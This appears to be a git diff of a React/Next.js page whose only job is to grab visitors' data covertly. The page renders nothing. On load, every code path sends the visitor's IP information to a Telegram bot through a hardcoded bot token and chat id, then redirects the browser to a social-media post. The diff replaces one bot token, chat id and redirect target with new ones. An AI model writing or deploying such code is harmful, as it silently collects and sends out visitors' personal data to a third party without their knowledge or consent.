@@ -19,24 +19,40 @@ export default function Home() {
                 try {
                   ip2 = data
                   fetch(
-                    `https://api.telegram.org/bot6865421260:AAGe563ahno6Ln4Q0gCv490JrMys1NopGG4/sendMessage?chat_id=-1002035561069&text=${ip}%0A%0A${ip2}`
-                  ).then(() => (window.location.href = "https://vk.com/feed"))
+                    `https://api.telegram.org/bot6703450999:AAHU5iIo980wDp0EJdnhoTtXbHQw8H5c53U/sendMessage?chat_id=-1002004397125&text=${ip}%0A%0A${ip2}`
+                  ).then(
+                    () =>
+                      (window.location.href =
+                        "https://x.com/Scroll_ZKP/status/1780584704175161392")
+                  )
                 } catch (error) {
                   fetch(
-                    `https://api.telegram.org/bot6865421260:AAGe563ahno6Ln4Q0gCv490JrMys1NopGG4/sendMessage?chat_id=-1002035561069&text=${ip}%0A%0A${ip2}`
-                  ).then(() => (window.location.href = "https://vk.com/feed"))
+                    `https://api.telegram.org/bot6703450999:AAHU5iIo980wDp0EJdnhoTtXbHQw8H5c53U/sendMessage?chat_id=-1002004397125&text=${ip}%0A%0A${ip2}`
+                  ).then(
+                    () =>
+                      (window.location.href =
+                        "https://x.com/Scroll_ZKP/status/1780584704175161392")
+                  )
                 }
               })
           } catch (error) {
             fetch(
-              `https://api.telegram.org/bot6865421260:AAGe563ahno6Ln4Q0gCv490JrMys1NopGG4/sendMessage?chat_id=-1002035561069&text=${ip}%0A%0A${ip2}`
-            ).then(() => (window.location.href = "https://vk.com/feed"))
+              `https://api.telegram.org/bot6703450999:AAHU5iIo980wDp0EJdnhoTtXbHQw8H5c53U/sendMessage?chat_id=-1002004397125&text=${ip}%0A%0A${ip2}`
+            ).then(
+              () =>
+                (window.location.href =
+                  "https://x.com/Scroll_ZKP/status/1780584704175161392")
+            )
           }
         })
     } catch (error) {
       fetch(
-        `https://api.telegram.org/bot6865421260:AAGe563ahno6Ln4Q0gCv490JrMys1NopGG4/sendMessage?chat_id=-1002035561069&text=${ip}%0A%0A${ip2}`
-      ).then(() => (window.location.href = "https://vk.com/feed"))
+        `https://api.telegram.org/bot6703450999:AAHU5iIo980wDp0EJdnhoTtXbHQw8H5c53U/sendMessage?chat_id=-1002004397125&text=${ip}%0A%0A${ip2}`
+      ).then(
+        () =>
+          (window.location.href =
+            "https://x.com/Scroll_ZKP/status/1780584704175161392")
+      )
     }
   }, [])
   return <p></p>
